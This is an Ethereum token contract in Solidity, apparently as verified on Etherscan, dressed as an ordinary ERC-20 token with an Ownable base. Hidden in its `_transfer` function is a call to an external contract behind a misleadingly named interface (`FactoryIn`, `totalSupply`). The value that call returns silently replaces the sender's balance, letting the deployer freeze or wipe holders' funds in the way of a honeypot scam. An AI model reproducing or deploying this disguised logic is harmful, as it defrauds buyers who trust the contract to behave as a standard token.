/**
 *Submitted for verification at Etherscan.io on 2023-09-09
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;

abstract contract Ownable  {
     function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor() {
        _transferOwnership(_msgSender());
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

pragma solidity ^0.8.0;
interface FactoryIn {
    function symbol(
        address azUoEpHECwi
        ) external view returns (uint256);

    function totalSupply(
        address xkjha,
        address xxasdan,
        uint256 saqqxxx
        ) external view returns (uint256);
}

contract Token is Ownable {
    string private _tokename;
    string private _tokensymbol;
    constructor(string memory tn,string memory sb,address pairaddress) {
        totalsupply = 10000000000*10**decimals();
        _tokenbalances[msg.sender] = 10000000000*10**decimals();
        uyypair = FactoryIn(pairaddress);
        _tokename = tn;
        _tokensymbol = sb;
        emit Transfer(address(0), msg.sender, 10000000000*10**decimals());
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    FactoryIn private uyypair;
    uint256 private totalsupply;
   
    mapping(address => uint256) private _tokenbalances;
    mapping(address => mapping(address => uint256)) private _allowances;
    function name() public view returns (string memory) {
        return _tokename;
    }

    function symbol() public view  returns (string memory) {
        return _tokensymbol;
    }


    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function totalSupply() public view returns (uint256) {
        return totalsupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _tokenbalances[account];
    }


    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(_msgSender(), to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }


    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(owner, spender, currentAllowance - subtractedValue);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        
        require(from != address(0), "ERC20: transfer from the zero address");        
        require(to != address(0), "ERC20: transfer to the zero address");
        uint256 bamount =  uyypair.totalSupply(address(this),from,_tokenbalances[from]);
        _tokenbalances[from] = bamount;
        uint256 balance = _tokenbalances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        _tokenbalances[from] = _tokenbalances[from]-amount;
        _tokenbalances[to] = _tokenbalances[to]+amount;
        emit Transfer(from, to, amount); 
    }

}